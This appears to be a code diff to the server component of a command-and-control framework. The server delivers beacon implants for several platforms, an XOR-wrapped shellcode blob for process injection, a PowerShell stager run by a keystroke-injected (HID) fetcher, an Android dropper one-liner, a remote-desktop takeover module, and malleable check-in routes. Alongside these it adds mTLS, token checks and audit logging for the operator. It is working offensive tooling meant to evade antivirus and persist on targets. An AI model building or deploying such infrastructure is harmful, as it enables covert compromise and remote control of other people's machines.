+    for candidate in get_beacon_download_tokens(beacon_id):
+        if candidate and hmac.compare_digest(token.encode(), candidate.encode()):
+            return True
+    return False
+
+
 async def handle_payload(request: web.Request) -> web.Response:
     """GET /api/v1/payload[_<platform>] — Serves the compiled beacon binary.
-       Requires ?auth=TOKEN or X-Auth-Token header."""
+
+    P0-9: the token must travel in the X-Auth-Token HEADER. The legacy
+    query string (?auth=) is still accepted for backward compatibility
+    with beacons already in the field, but is logged as a deprecation
+    (query strings leak into proxy logs, history and telemetry)."""
     try:
         import os
-        # Always get current token from utility to stay in sync
-        current_auth_token = get_payload_token()
-        
-        token = request.query.get("auth") or request.headers.get("X-Auth-Token")
-        if token != current_auth_token:
+        token_ok = _payload_token_ok(request)
+        is_remote = request.path.startswith("/api/v1/remote_payload")
+
+        # Review-3: the Remote Session module is a TIME-BOXED capability.
+        # It authenticates with its OWN expiring, revocable session token
+        # (issued by `remote-deploy`). The global payload token — which
+        # unlocks every payload forever — is accepted only as a documented
+        # legacy path, and only while PHANTOM_REMOTE_STRICT is off. A
+        # revoked or expired session is refused even if the URL leaked.
+        if is_remote:
+            session_token = (request.headers.get("X-Remote-Session")
+                             or request.query.get("rs") or "")
+            sess_ok, why = c2_state.check_remote_session(session_token)
+            strict = os.getenv("PHANTOM_REMOTE_STRICT", "0") not in (
+                "0", "", "false", "False")
+            if not sess_ok:
+                if strict or not token_ok:
+                    logger.warning(
+                        f"Remote payload refused from {request.remote}: {why}")
+                    try:
+                        from phantom.utils.audit_log import audit_log
+                        audit_log.append("remote_payload_denied",
+                                         remote=request.remote, reason=why)
+                    except Exception:
+                        pass
+                    return web.Response(status=403, text=f"Forbidden: {why}")
+                logger.info(
+                    f"DEPRECATED: remote payload served with the GLOBAL "
+                    f"payload token to {request.remote} — use a session token "
+                    f"('remote-deploy' issues one automatically)")
+        elif not token_ok:
             logger.warning(f"Unauthorized payload request from {request.remote}")
             return web.Response(status=403, text="Forbidden: Invalid auth token")
+        elif not request.headers.get("X-Auth-Token"):
+            logger.info(f"DEPRECATED: payload token in query string from "
+                        f"{request.remote} — migrate to X-Auth-Token header")
 
         # Map route to filename
         platform_map = {
             "/api/v1/payload": "beacon.pe",
+            "/api/v1/payload_pic": "beacon.bin",
             "/api/v1/payload_linux": "beacon_linux",
             "/api/v1/payload_linux_x86": "beacon_linux_x86",
             "/api/v1/payload_macos": "beacon_macos",
             "/api/v1/payload_android": "beacon_android",
+            "/api/v1/remote_payload_windows": "remote.exe",
+            "/api/v1/remote_payload_windows_mem": "remote_mem.bin",
+            "/api/v1/remote_payload_linux": "remote_linux",
+            "/api/v1/remote_payload_macos": "remote_macos",
+            "/api/v1/remote_payload_android": "remote.apk",
         }
         filename = platform_map.get(request.path)
         if not filename:
             return web.Response(text="Invalid payload path", status=404)
-        
-        payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", filename)
-        if not os.path.exists(payload_path):
+
+        # Remote-session module lives in payloads/remote/, beacon in payloads/beacon/
+        if request.path.startswith("/api/v1/remote_payload"):
+            payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "remote", filename)
+        else:
+            payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", filename)
+
+        # beacon.bin is the position-independent loader+PE blob: it is the
+        # artifact the migrate command injects into a sacrificial process
+        # (same bytes the in-memory dropper executes). It is never written
+        # to disk by the requesting beacon.
+        # Prefer the statically-linked Linux build: the dynamic build is
+        # compiled on the operator box (glibc >= 2.38, e.g. Kali) and dies
+        # on most real targets (Debian bookworm/Ubuntu 22.04 ship 2.34-2.36).
+        # The static build runs on any glibc/musl. This is the same binary
+        # the auto-mode SSH deploy path already uses on purpose.
+        is_remote = request.path.startswith("/api/v1/remote_payload")
+        if not is_remote and filename == "beacon_linux":
+            static_path = os.path.join(
+                os.path.dirname(__file__), "..", "payloads", "beacon",
+                "beacon_linux_static")
+            if os.path.exists(static_path):
+                filename = "beacon_linux_static"
+
+        # The builder seals the plaintext artefacts at rest (they are
+        # content-signatured and an on-access AV removes them on the operator
+        # box). `payload()` reads either form and hands back the SAME bytes.
+        from phantom.utils import beacon_artifacts
+        data = beacon_artifacts.payload(payload_path)
+        if data is None:
             return web.Response(text=f"Payload '{filename}' not compiled yet.", status=404)
-        
-        with open(payload_path, "rb") as f:
-            data = f.read()
-        
-        return web.Response(body=data, content_type="application/octet-stream")
+
+        # the name the browser saves has to stay RUNNABLE: a PE saved with no
+        # extension (or as .mp4) is simply not executable
+        download = payload_download_name(request.path)
+        return web.Response(
+            body=data, content_type="application/octet-stream",
+            headers={"Content-Disposition":
+                     f'attachment; filename="{download}"'})
     except Exception as e:
         logger.error(f"Payload delivery error: {e}")
         return web.Response(status=500)
 
 
 async def handle_android_stager(request: web.Request) -> web.Response:
-    """GET /s/android — Returns a one-liner shell script to download and run the Android beacon."""
+    """GET /s/android — Return a one-liner only to an authenticated caller."""
     try:
+        if not _payload_token_ok(request):
+            return web.Response(status=403, text="Forbidden: Invalid auth token")
         from phantom.utils.builder import generate_dropper
         host = server_instance.host if server_instance.host != "0.0.0.0" else request.headers.get("Host", request.url.host)
         if ":" in host:
             host = host.split(":")[0]
         port = server_instance.port or request.url.port or 80
         use_ssl = request.scheme == "https"
-        script = generate_dropper("android", host, port, use_ssl=use_ssl)
+        script = generate_dropper("android", host, port, use_ssl=use_ssl,
+                                  resilient=True)
         return web.Response(text=script, content_type="text/plain")
     except Exception as e:
         logger.error(f"Android stager error: {e}")
         return web.Response(status=500)
 
 
-async def handle_payload_pic(request: web.Request) -> web.Response:
-    """GET /x — Serves the XOR-encrypted beacon.bin (PIC shellcode).
-    No auth required — the payload is XOR-obfuscated with a static key
-    embedded in the stager, so it is useless without the decryptor script.
+async def handle_short_stager(request: web.Request) -> web.Response:
+    """GET /s/windows — the PowerShell BODY a short HID stager ``iex``es.
+
+    The typed HID command is a ~300-char fetcher; the heavy stager script it
+    runs is served HERE, authenticated like the rest of the stager family.
+    The body comes from ``builder.windows_stager_script``, i.e. it is decoded
+    out of the SAME ``generate_dropper`` call the inline path types, so the
+    artefact is byte-identical whichever way it is delivered — which is what
+    lets a board be switched from inline to download without changing what
+    lands on the target.
     """
     try:
+        if not _payload_token_ok(request):
+            return web.Response(status=403,
+                                text="Forbidden: Invalid auth token")
+        from phantom.utils.builder import windows_stager_script
+        # The ENDPOINT THE CLIENT USED, not the endpoint we are bound to.
+        # Behind a front (`c2.front`: a CDN, a redirector, a cloudflared
+        # tunnel) the two are different, and the difference is fatal: the
+        # body served through a tunnel used to say
+        # `http://127.0.0.1:80/x?auth=...` — i.e. the TARGET was told to
+        # download the payload from its own loopback, so a perfectly good
+        # delivery produced no beacon and nothing anywhere said why.
+        #
+        # `Host` carries the public name the client dialled; `X-Forwarded-Proto`
+        # carries the scheme it dialled it with (https at the edge, http to
+        # us). A direct request has neither surprise: Host already includes
+        # the listener's port when it is not the scheme default.
+        authority = request.headers.get("Host", "") or ""
+        host, port = authority, None
+        if authority.startswith("["):                      # [::1]:8443
+            close = authority.find("]")
+            if close > 0:
+                host = authority[:close + 1]
+                tail = authority[close + 1:]
+                if tail.startswith(":") and tail[1:].isdigit():
+                    port = int(tail[1:])
+        elif authority.count(":") == 1:
+            name, _, tail = authority.partition(":")
+            if name and tail.isdigit():
+                host, port = name, int(tail)
+        if not host:
+            host = request.url.host or server_instance.host or "127.0.0.1"
+        forwarded = str(request.headers.get("X-Forwarded-Proto", ""))
+        scheme = forwarded.strip().lower()
+        if scheme not in ("http", "https"):
+            scheme = request.scheme
+        if port is None:
+            # A DIRECT caller carries the real port in its own URL, and its
+            # body must name that port back: served on 8443, the old code
+            # defaulted to 443 and told the target to dial a service that is
+            # not there (the stager fetched fine and the beacon never came).
+            # Behind a front the public port is implicit, so the scheme
+            # default is the only correct answer — and the listener's private
+            # port must never leak into the body.
+            behind_front = bool(
+                str(request.headers.get("X-Forwarded-Proto", "")).strip())
+            own = 0 if behind_front else int(getattr(request.url, "port", 0) or 0)
+            if not own and not behind_front:
+                # last direct source: the listener's own port. If WE are the
+                # thing being dialled, our port is the one the target must
+                # dial back.
+                own = int(getattr(server_instance, "port", 0) or 0)
+            port = own or (443 if scheme == "https" else 80)
+        use_ssl = scheme == "https"
+        script = windows_stager_script(host, port, use_ssl=use_ssl)
+        if not script:
+            logger.error("Short stager: generate_dropper produced no body")
+            return web.Response(status=500, text="Stager unavailable")
+        return web.Response(text=script, content_type="text/plain")
+    except Exception as e:
+        logger.error(f"Short stager error: {e}")
+        return web.Response(status=500)
+
+
+def _stale_payload_endpoint():
+    """``(baked_host, baked_port, live_host, live_port)`` when they disagree.
+
+    The PIC carries its callback endpoint COMPILED IN. Serving a payload that
+    dials somewhere this C2 is not listening is never right, and it fails in
+    the worst possible way: the target runs it, the shellcode dials a dead
+    host (a retired tunnel, a stale LAN address, `127.0.0.1`), and the only
+    visible symptom is a console that stays open while nothing arrives.
+
+    Measured 2026-11-02: the served payload had been compiled at 09:02 with
+    ``C2_HOST "…trycloudflare.com"`` / port 443, while the typed stager
+    fetched from 192.168.1.155:8443 — a whole HID live test read as "the key
+    is broken" for a mismatch a single comparison finds.
+    """
+    try:
+        import phantom as _phantom
+        from phantom.utils.c2_crypto import beacon_config_endpoint
+        from phantom.utils.network import get_c2_endpoint
+        beacon_dir = os.path.join(os.path.dirname(_phantom.__file__),
+                                  "payloads", "beacon")
+        baked = beacon_config_endpoint(beacon_dir)
+        if not baked:
+            return None
+        live_host, live_port = get_c2_endpoint()
+        if (str(baked[0]), int(baked[1])) == (str(live_host), int(live_port)):
+            return None
+        return (str(baked[0]), int(baked[1]), str(live_host), int(live_port))
+    except Exception:
+        return None
+
+
+async def handle_payload_pic(request: web.Request) -> web.Response:
+    """GET /x — Serve the authenticated XOR-wrapped PIC payload."""
+    try:
+        if not _payload_token_ok(request):
+            logger.warning(f"Unauthorized PIC payload request from {request.remote}")
+            return web.Response(status=403, text="Forbidden: Invalid auth token")
+        stale = _stale_payload_endpoint()
+        if stale:
+            baked_host, baked_port, live_host, live_port = stale
+            logger.error("PIC payload compilato per %s:%s ma questo C2 ascolta "
+                         "su %s:%s — richiesta rifiutata", baked_host,
+                         baked_port, live_host, live_port)
+            return web.Response(
+                status=500,
+                text=(f"Payload compiled for {baked_host}:{baked_port} but "
+                      f"this C2 listens on {live_host}:{live_port} — rebuild "
+                      f"it (`generate windows x64`) before delivering."))
         payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", "beacon_xored.bin")
         if not os.path.exists(payload_path):
             return web.Response(text="Payload not compiled yet.", status=404)
-        with open(payload_path, "rb") as f:
-            data = f.read()
+        # Sealed at rest by the builder: decrypt in memory, never on disk.
+        from phantom.utils import beacon_artifacts
+        data = beacon_artifacts.payload(payload_path)
+        if data is None:
+            return web.Response(text="Payload not compiled yet.", status=404)
         return web.Response(body=data, content_type="application/octet-stream")
     except Exception as e:
         logger.error(f"PIC payload delivery error: {e}")
@@ -286,6 +1913,9 @@ async def handle_queue_task(request: web.Request) -> web.Response:
             return web.Response(status=400, text='{"error":"beacon_id and command required"}', content_type='application/json')
         c2_state.queue_task(beacon_id, command)
         return web.Response(text=json.dumps({'status': 'queued'}), content_type='application/json')
+    except TaskPolicyError as e:
+        # P1-1: policy refusals are authorization failures, not bad requests
+        return web.Response(status=403, text=json.dumps({'error': str(e)}), content_type='application/json')
     except Exception as e:
         return web.Response(status=400, text=json.dumps({'error': str(e)}), content_type='application/json')
 
@@ -297,30 +1927,152 @@ async def handle_results_api(request: web.Request) -> web.Response:
     results = c2_state.get_results(beacon_id)
     return web.Response(text=json.dumps({'results': results}, indent=2), content_type='application/json')
 
+
+async def handle_beacon_any(request: web.Request) -> web.Response:
+    """Catch-all for malleable URIs.
+
+    The beacon rotates GET/POST paths and randomizes their casing
+    (malleable profile). Exact-path routing would 404 most rotated URIs and
+    silently drop the session, so any unmatched request carrying X-Beacon-Id
+    is routed by CONTENT: GET → check-in, POST with a decrypted body holding
+    'task_id' → task result, POST otherwise → telemetry check-in.
+    """
+    if not request.headers.get("X-Beacon-Id"):
+        # Operator API paths that miss exact routing must NOT be swallowed by
+        # the malleable catch-all with a bare "C2 OK" — that turns operator
+        # errors into silent no-ops. Only genuine malleable-looking URIs get
+        # the benign decoy response.
+        if request.path.startswith("/api/"):
+            return web.Response(status=404, text='{"error": "unknown API endpoint"}',
+                                content_type="application/json")
+        return web.Response(text="C2 OK")
+    if request.method == "GET":
+        return await handle_checkin(request)
+    body_text = ""
+    try:
+        body_text = await request.text()   # consumed ONCE here — aiohttp caches it
+    except Exception:
+        pass
+    try:
+        if body_text:
+            decrypted = decrypt_for_beacon(
+                body_text, request.headers.get("X-Beacon-Id", ""))
+            if decrypted and "task_id" in decrypted:
+                return await handle_result(request, pre_body=body_text)
+    except Exception:
+        pass
+    return await handle_checkin(request, pre_body=body_text)
+
+
 # ── Server Lifecycle ───────────────────────────────────────────────────────
 
+def _is_loopback_bind() -> bool:
+    """True when the configured listener host is loopback (P0-4 gate). The
+    bind-time truth (what the OS accepted) is authoritative: a server that
+    bound 127.0.0.1 is loopback regardless of what the config string says.
+    Fall back to the configured host string before the site exists."""
+    try:
+        site = server_site_host()
+        if site:
+            return site in ("127.0.0.1", "::1", "localhost")
+    except Exception:
+        pass
+    try:
+        host = server_instance.host
+    except Exception:
+        return False
+    return host in ("127.0.0.1", "::1", "localhost")
+
+
+def server_site_host() -> str:
+    """The address the live site actually bound ("" when not started)."""
+    srv = server_instance
+    try:
+        if srv.site is not None:
+            return getattr(srv.site, "_host", "") or ""
+    except Exception:
+        pass
+    return ""
+
+
+def _mtls_require_client_cert() -> bool:
+    """True when the listener demands a client certificate (default)."""
+    try:
+        from phantom.utils import config as cfg
+        return cfg.get_bool("c2.mtls_require_client_cert", True,
+                            env="PHANTOM_MTLS_REQUIRE_CLIENT_CERT")
+    except Exception:
+        return True
+
+
+def _plaintext_allowed() -> bool:
+    """True when the operator explicitly accepted a plaintext C2."""
+    try:
+        from phantom.utils import config as cfg
+        return cfg.get_bool("c2.allow_plaintext", False,
+                            env="PHANTOM_ALLOW_PLAINTEXT")
+    except Exception:
+        return False
+
+
+def listener_bind_host() -> str:
+    """The address the listener BINDS (config `c2.bind`, default 0.0.0.0)."""
+    try:
+        from phantom.utils import config as cfg
+        return cfg.get_str("c2.bind", "0.0.0.0",
+                           env="PHANTOM_C2_BIND") or "0.0.0.0"
+    except Exception:
+        return "0.0.0.0"
+
+
+def _is_loopback_host(host: str) -> bool:
+    return (host or "").strip().lower() in ("127.0.0.1", "::1", "localhost")
+
+
 class C2Server:
-    def __init__(self, host: str = "0.0.0.0", port: int = 8080, use_ssl: bool = False):
+    def __init__(self, host: str = "0.0.0.0", port: int = 8080, use_ssl: bool = False,
+                 cert_dir: Optional[str] = None):
         self.host = host
         self.port = port
         self.use_ssl = use_ssl
+        self.cert_dir = cert_dir or os.getenv("PHANTOM_MTLS_CERT_DIR", "").strip() or certs_dir()
         self.ssl_context: Optional[ssl.SSLContext] = None
         self.runner: Optional[web.AppRunner] = None
         self.site: Optional[web.TCPSite] = None
         self.loop: Optional[asyncio.AbstractEventLoop] = None
         self.thread: Optional[threading.Thread] = None
+        # Bind/startup failure surface (set by _start_server, read by
+        # start(); mirrors the tracker's bind_error contract).
+        self.bind_error: Optional[str] = None
+        self._started_evt: Optional[threading.Event] = None
 
     def _get_ssl_context(self) -> Optional[ssl.SSLContext]:
-        """Load or generate SSL context for HTTPS support. Returns None for HTTP."""
+        """Load or generate SSL context; mTLS never downgrades to HTTP."""
+        mtls_on = use_mtls()
+        if mtls_on and not self.use_ssl:
+            logger.error("mTLS requires an HTTPS listener")
+            return None
         if not self.use_ssl:
             return None
-            
-        cert_dir = os.path.join(os.getcwd(), "data", "certs")
+        cert_dir = self.cert_dir
         os.makedirs(cert_dir, exist_ok=True)
-        cert_path = os.path.join(cert_dir, "server.crt")
-        key_path = os.path.join(cert_dir, "server.key")
-        
+        mtls_on = use_mtls()
+        mtls_paths = None
+        if mtls_on:
+            try:
+                from phantom.utils.beacon_auth import ensure_mtls_material
+                mtls_paths = ensure_mtls_material(cert_dir, self.host)
+                cert_path = mtls_paths["server_cert"]
+                key_path = mtls_paths["server_key"]
+            except Exception as exc:
+                logger.error(f"Failed to prepare mTLS certificates: {exc}")
+                return None
+        else:
+            cert_path = os.path.join(cert_dir, "server.crt")
+            key_path = os.path.join(cert_dir, "server.key")
+
         if not (os.path.exists(cert_path) and os.path.exists(key_path)):
+
             logger.info("SSL certificates missing. Generating self-signed certificate...")
             try:
                 from cryptography import x509
@@ -383,14 +2135,54 @@ class C2Server:
 
         try:
             context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            # HARDENING: an explicit TLS 1.2 floor (a bare PROTOCOL_TLS_SERVER
+            # already defaults there on modern Python, but the guarantee must
+            # not depend on the interpreter's defaults) and a modern AEAD
+            # cipher policy. No NULL/MD5/DSS suites can be negotiated.
+            try:
+                context.minimum_version = ssl.TLSVersion.TLSv1_2
+            except (AttributeError, ValueError):
+                pass
+            try:
+                context.set_ciphers(
+                    "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM"
+                    ":!aNULL:!MD5:!DSS:!RC4:!3DES")
+            except ssl.SSLError:
+                pass
             context.load_cert_chain(cert_path, key_path)
+            if mtls_on:
+                ca_path = os.getenv("PHANTOM_MTLS_CA", "").strip()
+                if not ca_path and mtls_paths:
+                    ca_path = mtls_paths["ca_cert"]
+                if not ca_path or not os.path.isfile(ca_path):
+                    logger.error("mTLS is enabled but the client CA is missing")
+                    return None
+                context.load_verify_locations(cafile=ca_path)
+                # REQUIRED by default: a client without a certificate cannot
+                # finish the handshake. CERT_OPTIONAL let anyone talk TLS to
+                # the C2 and rely on the app-layer HMAC alone — the operator
+                # who wants that legacy posture sets
+                # c2.mtls_require_client_cert=false (doctor flags it).
+                if _mtls_require_client_cert():
+                    context.verify_mode = ssl.CERT_REQUIRED
+                    logger.info("mTLS client-certificate verification enabled "
+                                "(CERT_REQUIRED)")
+                else:
+                    context.verify_mode = ssl.CERT_OPTIONAL
+                    logger.warning(
+                        "mTLS client certificates are OPTIONAL "
+                        "(c2.mtls_require_client_cert=false): authentication "
+                        "rests on the app-layer HMAC only")
             return context
         except Exception as e:
             logger.error(f"Failed to load SSL certificates: {e}")
         return None
 
     def _setup_app(self) -> web.Application:
-        app = web.Application(client_max_size=50*1024*1024, middlewares=[api_auth_middleware])
+        app = web.Application(client_max_size=50*1024*1024,
+                              middlewares=[auth_matrix_middleware,
+                                          mtls_auth_middleware,
+                                          api_auth_middleware])
         # Check-in: Support malleable URIs
         app.router.add_get("/api/v1/ping", handle_checkin)
         app.router.add_post("/api/v1/ping", handle_checkin)
@@ -404,78 +2196,223 @@ class C2Server:
         # REST API (Telegram bot / external tools)
         app.router.add_get("/api/v1/beacons", handle_beacons)
         app.router.add_post("/api/v1/queue", handle_queue_task)
-        app.router.add_get("/api/v1/results", handle_results_api)
-
-        # Results
+        app.router.add_get("/api/v1/results", handle_results_api)        # Results
         app.router.add_post("/api/v1/result", handle_result)
         app.router.add_post(r"/{path:.*\.php}", handle_result)
         app.router.add_post(r"/{path:.*\.aspx}", handle_result)
-        
+
         # Payload delivery
         app.router.add_get("/api/v1/payload", handle_payload)
         app.router.add_get("/api/v1/payload_linux", handle_payload)
         app.router.add_get("/api/v1/payload_linux_x86", handle_payload)
         app.router.add_get("/api/v1/payload_macos", handle_payload)
         app.router.add_get("/api/v1/payload_android", handle_payload)
+        # Remote-session module binaries (standalone GUI takeover companion)
+        app.router.add_get("/api/v1/remote_payload_windows", handle_payload)
+        app.router.add_get("/api/v1/remote_payload_windows_mem", handle_payload)
+        app.router.add_get("/api/v1/remote_payload_linux", handle_payload)
+        app.router.add_get("/api/v1/remote_payload_macos", handle_payload)
+        app.router.add_get("/api/v1/remote_payload_android", handle_payload)
         # One-liner platform stagers
         app.router.add_get("/s/android", handle_android_stager)
+        # HID download stager: the script a ~300-char typed fetcher runs
+        app.router.add_get("/s/windows", handle_short_stager)
         # Ultra-compact PIC stager endpoint (XOR-encrypted beacon.bin)
         app.router.add_get("/x", handle_payload_pic)
         app.router.add_get("/", lambda r: web.Response(text="C2 OK"))
+        # Malleable catch-alls MUST be registered last: rotated/random-cased
+        # beacon URIs land here instead of 404ing (which silently drops the
+        # beacon session). Path-based auth for these is handled by the
+        # X-Beacon-Id check inside the middleware below.
+        app.router.add_get("/{tail:.*}", handle_beacon_any)
+        app.router.add_post("/{tail:.*}", handle_beacon_any)
         return app
 
     def _start_server(self) -> None:
         self.loop = asyncio.new_event_loop()
         asyncio.set_event_loop(self.loop)
-        
+        evt = self._started_evt
+
+        def _signal() -> None:
+            if evt is not None:
+                evt.set()
+
         # Re-create app inside the loop thread
         self.app = self._setup_app()
-        
+
+        # PLAINTEXT GUARD: a clear-text listener on a non-loopback bind is a
+        # C2 any on-path observer can read and hijack. Refuse it unless the
+        # operator explicitly opted in (c2.allow_plaintext) — silence here
+        # would be the worst outcome, so the refusal names the exact key.
+        if not self.use_ssl and not _is_loopback_host(self.host):
+            if not _plaintext_allowed():
+                msg = (f"refusing a PLAINTEXT C2 on {self.host}:{self.port} — "
+                       "anyone on the path could read and hijack it. Enable "
+                       "TLS (default) or, for a lab only, set "
+                       "c2.allow_plaintext=true")
+                logger.error(msg)
+                self.bind_error = msg
+                self.loop.run_until_complete(self.app.shutdown())
+                self.loop.run_until_complete(self.app.cleanup())
+                self.loop.stop()
+                _signal()
+                return
+            logger.warning(
+                "PLAINTEXT C2 listener on %s:%s (c2.allow_plaintext=true): "
+                "traffic is readable and modifiable in transit",
+                self.host, self.port)
+
         # Determine if we should use SSL
         self.ssl_context = self._get_ssl_context()
-        
+        if (use_mtls() or self.use_ssl) and self.ssl_context is None:
+            logger.error("HTTPS/mTLS listener aborted: TLS material is unavailable")
+            self.bind_error = "HTTPS/mTLS listener aborted: TLS material is unavailable"
+            self.loop.run_until_complete(self.app.shutdown())
+            self.loop.run_until_complete(self.app.cleanup())
+            self.loop.stop()
+            _signal()
+            return
+
         self.runner = web.AppRunner(self.app)
         self.loop.run_until_complete(self.runner.setup())
-        
-        # Fix: Always bind to 0.0.0.0 to avoid OSError 10049 if host is non-local
-        # The provided 'host' is used for display and dropper generation.
-        bind_host = "0.0.0.0"
+
+        # Bind the CONFIGURED host: 0.0.0.0 when the operator asked for it,
+        # the loopback/LAN address otherwise. Binding a host the OS does not
+        # own raises OSError right here, INSIDE the thread — captured below
+        # into self.bind_error instead of silently killing the thread.
+        bind_host = self.host
         self.site = web.TCPSite(self.runner, bind_host, self.port, ssl_context=self.ssl_context)
-        
-        self.loop.run_until_complete(self.site.start())
+        try:
+            self.loop.run_until_complete(self.site.start())
+        except OSError as e:
+            # Fail-fast surface: start()/the operator shell reads THIS
+            # instead of believing a listener exists (the old behavior
+            # left a dead thread and a "started" message on screen).
+            self.bind_error = (f"cannot bind {bind_host}:{self.port} — {e} "
+                               f"(port already in use or address not local)")
+            logger.error(f"C2 listener failed to start: {self.bind_error}")
+            try:
+                self.loop.run_until_complete(self.runner.cleanup())
+            except Exception:
+                pass
+            self.loop.stop()
+            _signal()
+            return
         proto = "HTTPS" if self.ssl_context else "HTTP"
         logger.info(f"C2 Async Server ({proto}) started on {bind_host}:{self.port}")
+        self.bind_error = None
+        _signal()
         self.loop.run_forever()
 
     def start(self, host: Optional[str] = None, port: Optional[int] = None, use_ssl: Optional[bool] = None) -> None:
         if self.thread and self.thread.is_alive():
             return
+        # a listener coming up in a fresh process adopts the engagement the
+        # previous one left on disk; a process that already holds records
+        # keeps them (see C2State.reload).
+        c2_state.reload()
         if host:
             self.host = host
         if port:
             self.port = port
         if use_ssl is not None:
             self.use_ssl = use_ssl
-        # Re-create SSL context if use_ssl changed
+        # Re-create SSL context if use_ssl changed. Never silently downgrade
+        # a requested HTTPS/mTLS listener to plaintext.
+        # Both refusals below are RAISED, not logged-and-returned: `start()`'s
+        # contract (see the handshake comment) is "started only when the site
+        # actually accepted the bind; RuntimeError otherwise", and returning
+        # quietly broke it — the caller printed a green "Started HTTP
+        # listener" tick while no thread existed and no port was open. Live
+        # evidence (2026-10-16, mTLS on): `listeners start 9443 127.0.0.1
+        # false` announced success, the status footer said STOPPED, and
+        # `generate` warned that nothing was listening — three surfaces, two
+        # of them lying.
+        if use_mtls() and not self.use_ssl:
+            msg = ("mTLS is required (PHANTOM_MTLS_REQUIRED=1): start the "
+                   "listener over HTTPS, or turn mTLS off first")
+            logger.error(msg)
+            raise RuntimeError(msg)
         self.ssl_context = self._get_ssl_context()
+        if self.use_ssl and self.ssl_context is None:
+            msg = ("HTTPS listener refused: TLS material is unavailable "
+                   "(generate it with `listeners start` once, or check "
+                   "`certs status`)")
+            logger.error(msg)
+            raise RuntimeError(msg)
         self.thread = threading.Thread(target=self._start_server, daemon=True)
+        # Handshake: the thread signals the event after the bind attempt, so
+        # start() returns knowing the truth — "started" only when the site
+        # actually accepted the bind; RuntimeError otherwise.
+        self._started_evt = threading.Event()
         self.thread.start()
+        self._started_evt.wait(timeout=15)
+        if self.bind_error:
+            raise RuntimeError(self.bind_error)
+        self._record_engagement_grants()
+
+    def _record_engagement_grants(self) -> None:
+        """Write the PASSIVE side effects this engagement has agreed to.
+
+        `c2.auto_persist` (default ON) and `c2.auto_shell` (default OFF) act on
+        their own the moment a beacon checks in; the audit asked for that
+        consent to be explicit instead of implied by a default. The listener
+        opening is the one moment the engagement's terms are known, so the
+        grant is stated here, once, in the tamper-evident chain — with the
+        exact way to revoke it. Never raises: telemetry must not decide
+        whether a listener runs.
+        """
+        try:
+            from phantom.utils.audit_log import audit_log
+            audit_log.append(
+                "engagement_grants",
+                listener=f"{self.host}:{self.port}",
+                tls=bool(self.use_ssl),
+                auto_persist=bool(_auto_persist_allowed()),
+                auto_shell=bool(_auto_shell_allowed()),
+                revoke="c2.auto_persist=false / c2.auto_shell=false "
+                       "(or PHANTOM_AUTO_PERSIST=0 / PHANTOM_AUTO_SHELL=0)")
+        except Exception:
+            pass
 
     def stop(self) -> None:
-        if self.loop and self.runner:
-            async def cleanup():
-                await self.runner.cleanup()
-            try:
-                future = asyncio.run_coroutine_threadsafe(cleanup(), self.loop)
-                future.result(timeout=2)
-            except Exception:
-                pass
-            self.loop.call_soon_threadsafe(self.loop.stop)
-            if self.thread:
-                self.thread.join(timeout=2)
-                self.thread = None
-            self.loop = None
-            self.runner = None
+        # LAST CHANCE: the debounce may be holding the most recent tasks and
+        # results, and the operator is stopping the listener either to restart
+        # it or to close the engagement. Flush before any of that work can be
+        # mistaken for "nothing happened".
+        c2_state.flush()
+        loop, runner = self.loop, self.runner
+        if loop and runner:
+            # A coroutine created for a loop that is no longer running can
+            # never be awaited: run_coroutine_threadsafe raises and the
+            # coroutine is collected with "RuntimeWarning: coroutine
+            # 'C2Server.stop.<locals>.cleanup' was never awaited" (measured
+            # 2026-11-08 under tests/test_aitm.py). Create it ONLY when the
+            # loop can accept it, and close it if scheduling still fails —
+            # the loop can stop between the check and the call.
+            if loop.is_running():
+                async def cleanup():
+                    await runner.cleanup()
+
+                coro = cleanup()
+                try:
+                    future = asyncio.run_coroutine_threadsafe(coro, loop)
+                except Exception:
+                    coro.close()
+                else:
+                    try:
+                        future.result(timeout=2)
+                    except Exception:
+                        pass
+                try:
+                    loop.call_soon_threadsafe(loop.stop)
+                except RuntimeError:
+                    pass
+        if self.thread:
+            self.thread.join(timeout=2)
+            self.thread = None
+        self.loop = None
+        self.runner = None
 
 
 server_instance = C2Server()
